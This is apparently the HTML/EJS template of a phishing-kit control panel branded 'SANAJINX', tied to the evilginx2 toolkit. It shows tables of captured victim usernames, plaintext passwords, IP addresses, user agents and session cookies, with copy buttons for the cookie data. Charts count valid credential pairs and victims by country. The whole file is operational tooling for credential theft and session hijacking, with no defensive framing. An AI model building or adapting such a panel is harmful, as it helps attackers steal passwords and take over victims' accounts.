<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <title>SANAJINX</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="css/main.css">
    <meta name="viewport" content="width=device-width">
    <link rel="shortcut icon" type="image/png" href="https://i.ibb.co/ngc4n9L/w-removebg-preview-1.png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css"
          integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <style>
        /* General Styling */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            color: #333;
        }

        .header {
            text-align: center;
            padding: 20px;
            background-color: #442f7d;
            color: white;
        }

        .header img {
            max-width: 135px;
            height: auto;
        }

        .telegram {
            position: absolute;
            top: 20px;
            right: 20px;
            color: white;
            font-size: 20px;
        }

        /* Tab Styles */
        .tabs {
            display: flex;
            justify-content: space-between; /* Distributes buttons to occupy full width */
            margin-bottom: 10px; /* Adjusted to position tabs higher */
            margin-top: 20px; /* Added margin to push tabs down */
            position: relative;
        }

        .tabs button {
            flex: 1; /* Makes buttons take equal space */
            background-color: #442f7d; /* Updated background color */
            color: white;
            padding: 25px; /* Adjust padding for button size */
            border: none;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            font-size: 18px;
            margin: 0; /* No margin to ensure full coverage */
            border-radius: 0; /* Remove rounded corners for full-width effect */
            font-weight: bold; /* Make text bold */
            text-align: center; /* Center the text */
            height: 70px; /* Set a fixed height for buttons */
        }

        .tabs button:hover {
            background-color: #4CAF50;
        }

        .tabs button.active {
            background-color: #4CAF50;
            transform: scale(1.05); /* Slightly enlarge active button */
            height: 70px; /* Ensure active button matches the height of non-active buttons */
            border-radius: 35px; /* Rounded corners for the active button */

        }

        .tabcontent {
            display: none;
            padding: 20px;
            animation: fadeEffect 1s;
        }

        @keyframes fadeEffect {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        /* Table Styles */
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }

        th,
        td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }

        th {
            background-color: #442f7d;
            color: white;
        }

        tr:hover {
            background-color: #f1f1f1;
        }

        /* Button Styling */
        button {
            background-color: #442f7d;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #4CAF50;
        }

        /* Chart Container */
        #pieChart {
            max-width: 600px;
            margin: 0 auto;
        }

        /* Responsive Design */
        @media screen and (max-width: 600px) {
            table,
            th,
            td {
                display: block;
                width: 100%;
                box-sizing: border-box;
            }

            th,
            td {
                text-align: right;
            }

            th {
                background-color: #442f7d;
                color: white;
                padding: 10px;
            }
        }

        /* Search Bar */
        #searchInput {
            width: 100%;
            padding: 12px;
            margin: 12px 10px 12px 0;
            box-sizing: border-box;
            font-size: 16px;
        }

        /* Filter Dropdown */
        #filterSelect {
            padding: 12px;
            margin: 12px 0;
            font-size: 16px;
            width: auto;
        }

        /* Search Container */
        .search-container {
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }

        .btn-purple {
            color: #fff;
            background-color: #462b79;
            border-color: #462b79;
        }

        .btn-purple:hover {
            background-color: #28a745;
            border-color: #28a745;
        }
    </style>
</head>

<body>
<!-- Header Section -->
<div class="header">
    <img src="https://i.ibb.co/ngc4n9L/w-removebg-preview-1.png" alt="SANAJINX Logo">
    <h1>SANAJINX</h1>
    <div class="telegram">Telegram: @evilginx2</div>
</div>
<!-- Active Bar Section -->
<div class="active-bar" id="activeBar"></div>

<!-- Tabs Section -->
<div class="tabs">
    <button class="tablinks" onclick="openTab(event, 'Sessions')" id="defaultOpen">Sessions</button>
    <button class="tablinks" onclick="openTab(event, 'LiveChart')">Live</button>
</div>

<!-- Tab Content: Session Data Table -->
<div id="Sessions" class="tabcontent">
    <div class="search-container">
        <select id="filterSelect" onchange="searchTable()">
            <option value="all">All</option>
            <option value="session">Session</option>
            <option value="username">Username</option>
            <option value="ip">IP</option>
        </select>
        <input type="text" id="searchInput" onkeyup="searchTable()" placeholder="Search...">
    </div>
    <div class="table table-responsive">
        <table id="sessionTable">
            <tr>
                <th>Session</th>
                <th>Username</th>
                <th>Password</th>
                <th>User IP</th>
                <th>User Agent</th>
                <th>Time</th>
                <th>Cookies</th>
            </tr>
            <% data.sort((a, b) => b.id - a.id).map(item => { %> <!-- Sort sessions by descending ID -->

            <tr>
                <td style="word-break: break-all; font-size: 90%; padding: 20px 10px;"><%= item.id %></td>
                <td><%= item.username %></td>
                <td><%= item.password %></td>
                <td><%= item.remote_addr %></td>
                <td><%= item.useragent %></td>
                <td><%= JSON.stringify(new Date(item.create_time).toLocaleString()) %></td>
                <td>
                    <button class="btn btn-purple btn-sm" onclick="copyDetails(this)">
                        Copy Details
                        <span style="display: none"><%= JSON.stringify(item.custom) %></span>
                    </button>
                </td>
            </tr>
            <% }) %>
        </table>
    </div>

</div>

<!-- Tab Content: Live Pie Chart -->
<div id="LiveChart" class="tabcontent">
    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <h5>Cookie vs Session State </h5>
                    </div>
                    <div class="card-body">
                        <canvas id="myChart" style="max-height: 300px"></canvas>
                    </div>
                </div>
            </div>
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <h5>User Access Info State </h5>
                    </div>
                    <div class="card-body">
                        <canvas id="userPassPieChart" style="max-height: 300px"></canvas>
                    </div>
                </div>
            </div>

            <div class="table table-responsive1">
                <table id="sessionTable">
                    <tr>
                        <th>Session</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>User IP</th>
                        <th>User Agent</th>
                        <th>Time</th>
                        <th>Cookies</th>
                    </tr>
                    <% data.sort((a, b) => b.id - a.id).forEach(item => { %> <!-- Sort sessions by descending ID -->
                    <% if (item.username || item.password || item.cookies) { %>
                        <!-- Only show if any of these are not empty -->
                        <tr>
                            <td style="word-break: break-all; font-size: 90%; padding: 20px 10px;"><%= item.id %></td>
                            <td><%= item.username || 'N/A' %></td> <!-- Display 'N/A' if empty -->
                            <td><%= item.password || 'N/A' %></td> <!-- Display 'N/A' if empty -->
                            <td><%= item.remote_addr %></td>
                            <td><%= item.useragent %></td>
                            <td><%= JSON.stringify(new Date(item.create_time).toLocaleString()) %></td>
                            <td>
                                <button class="btn btn-purple btn-sm" onclick="copyDetails(this)">
                                    Copy Details
                                    <span style="display: none"><%= JSON.stringify(item.custom) %></span>
                                </button>
                            </td>
                        </tr>
                    <% } %>
                    <% }) %>
                </table>
            </div>
        </div>
    </div>
</div>

<!-- JavaScript Section -->
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<!-- Resources -->
<script src="https://cdn.amcharts.com/lib/5/index.js"></script>
<script src="https://cdn.amcharts.com/lib/5/xy.js"></script>
<script src="https://cdn.amcharts.com/lib/5/themes/Animated.js"></script>
<script>
    // Function to open tabs
    function openTab(evt, tabName) {
        let i, tabcontent, tablinks;
        tabcontent = document.getElementsByClassName("tabcontent");
        for (i = 0; i < tabcontent.length; i++) {
            tabcontent[i].style.display = "none";
        }
        tablinks = document.getElementsByClassName("tablinks");
        for (i = 0; i < tablinks.length; i++) {
            tablinks[i].className = tablinks[i].className.replace(" active", "");
        }
        // Move the active bar
        const activeBar = document.getElementById('activeBar');
        const buttonRect = evt.currentTarget.getBoundingClientRect();
        activeBar.style.width = buttonRect.width + 'px'; // Set the width to match the button
        activeBar.style.left = buttonRect.left - document.querySelector('.tabs').getBoundingClientRect().left + 'px'; // Position the active bar

        // Show the selected tab content
        document.getElementById(tabName).style.display = "block";
        evt.currentTarget.className += " active";
    }

    // Copy details button function
    function copyDetails(ele) {
        var input = document.createElement('textarea');
        input.innerHTML = ele.children[0].innerText;
        document.body.appendChild(input);
        input.select();
        document.execCommand('copy');
        document.body.removeChild(input);
        alert("Copied the text: " + ele.children[0].innerText);
    }

    // Set default open tab
    document.getElementById("defaultOpen").click();

    // Search table function
    function searchTable() {
        let input = document.getElementById("searchInput");
        let filter = input.value.toLowerCase();
        let filterSelect = document.getElementById("filterSelect").value;
        let table = document.getElementById("sessionTable");
        let tr = table.getElementsByTagName("tr");

        for (let i = 1; i < tr.length; i++) {
            let td = tr[i].getElementsByTagName("td");
            let rowContainsSearchText = false;

            for (let j = 0; j < td.length; j++) {
                if (filterSelect === "all" ||
                    (filterSelect === "session" && j === 0) ||
                    (filterSelect === "username" && j === 1) ||
                    (filterSelect === "ip" && j === 3)) {
                    if (td[j] && td[j].innerHTML.toLowerCase().indexOf(filter) > -1) {
                        rowContainsSearchText = true;
                        break;
                    }
                }
            }

            tr[i].style.display = rowContainsSearchText ? "" : "none";
        }
    }

    // Pie Chart configuration
    const ctx = document.getElementById('myChart');
    new Chart(ctx, {
        type: 'polarArea',
        data: {
            labels: ['Session', 'Cookies'],
            datasets: [{
                label: 'Total',
                data: [<%= sessionCount %>, <%= cookieCount %>],
                backgroundColor: ['#442f7d', '#964d9a'],
                hoverOffset: 4
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: {
                    position: 'top',
                },
                title: {
                    display: true,
                    text: 'Live Data Overview'
                }
            }
        }
    });

    const userPassPieChart = document.getElementById('userPassPieChart');
    new Chart(userPassPieChart, {
        type: 'doughnut',
        data: {
            labels: ['Valid', 'Valid User Name', 'Valid Password', 'Both Invalid'],
            datasets: [{
                label: 'Total',
                data: [<%= validUser %>,<%= validUserCount %>, <%= validPasswordCount %>, <%= invalidUserPassCount %>],
                backgroundColor: ['#4CAF50', '#0E8686FF', '#442f7d', 'red'],
                hoverOffset: 4
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: {
                    position: 'top',
                },
                title: {
                    display: true,
                    text: 'Live Data Overview'
                }
            }
        }
    });

    async function fetchCountryData() {
        try {
            const response = await fetch('/countryCount');
            return await response.json();
        } catch (error) {
            console.error('Error fetching country data:', error);
        }
    }


    am5.ready(async function () {
        const countryData = await fetchCountryData();
        // Convert country data to Highcharts format
        const data = Object.keys(countryData).map(item => {
            return {
                'country': item,
                'value': countryData[item]
            };
        });
        // Create root element
        // https://www.amcharts.com/docs/v5/getting-started/#Root_element
        var root = am5.Root.new("countryWiseIpCount");

        // Set themes
        // https://www.amcharts.com/docs/v5/concepts/themes/
        root.setThemes([
            am5themes_Animated.new(root)
        ]);

        // Create chart
        // https://www.amcharts.com/docs/v5/charts/xy-chart/
        var chart = root.container.children.push(am5xy.XYChart.new(root, {
            panX: true,
            panY: true,
            wheelX: "panX",
            wheelY: "zoomX",
            pinchZoomX: true,
            paddingLeft: 0,
            paddingRight: 1
        }));

        // Add cursor
        // https://www.amcharts.com/docs/v5/charts/xy-chart/cursor/
        var cursor = chart.set("cursor", am5xy.XYCursor.new(root, {}));
        cursor.lineY.set("visible", false);


        // Create axes
        // https://www.amcharts.com/docs/v5/charts/xy-chart/axes/
        var xRenderer = am5xy.AxisRendererX.new(root, {
            minGridDistance: 30,
            minorGridEnabled: true
        });

        xRenderer.labels.template.setAll({
            rotation: -90,
            centerY: am5.p50,
            centerX: am5.p100,
            paddingRight: 15
        });

        xRenderer.grid.template.setAll({
            location: 1
        })

        var xAxis = chart.xAxes.push(am5xy.CategoryAxis.new(root, {
            maxDeviation: 0.3,
            categoryField: "country",
            renderer: xRenderer,
            tooltip: am5.Tooltip.new(root, {})
        }));

        var yRenderer = am5xy.AxisRendererY.new(root, {
            strokeOpacity: 0.1
        })

        var yAxis = chart.yAxes.push(am5xy.ValueAxis.new(root, {
            maxDeviation: 0.3,
            renderer: yRenderer
        }));

        // Create series
        // https://www.amcharts.com/docs/v5/charts/xy-chart/series/
        var series = chart.series.push(am5xy.ColumnSeries.new(root, {
            name: "Series 1",
            xAxis: xAxis,
            yAxis: yAxis,
            valueYField: "value",
            sequencedInterpolation: true,
            categoryXField: "country",
            tooltip: am5.Tooltip.new(root, {
                labelText: "{valueY}"
            })
        }));

        series.columns.template.setAll({cornerRadiusTL: 5, cornerRadiusTR: 5, strokeOpacity: 0});
        series.columns.template.adapters.add("fill", function (fill, target) {
            return chart.get("colors").getIndex(series.columns.indexOf(target));
        });

        series.columns.template.adapters.add("stroke", function (stroke, target) {
            return chart.get("colors").getIndex(series.columns.indexOf(target));
        });

        // Set data

        xAxis.data.setAll(data);
        series.data.setAll(data);

        // Make stuff animate on load
        // https://www.amcharts.com/docs/v5/concepts/animations/
        series.appear(1000);
        chart.appear(1000, 100);

    }); // end am5.ready()
</script>
</body>

</html>
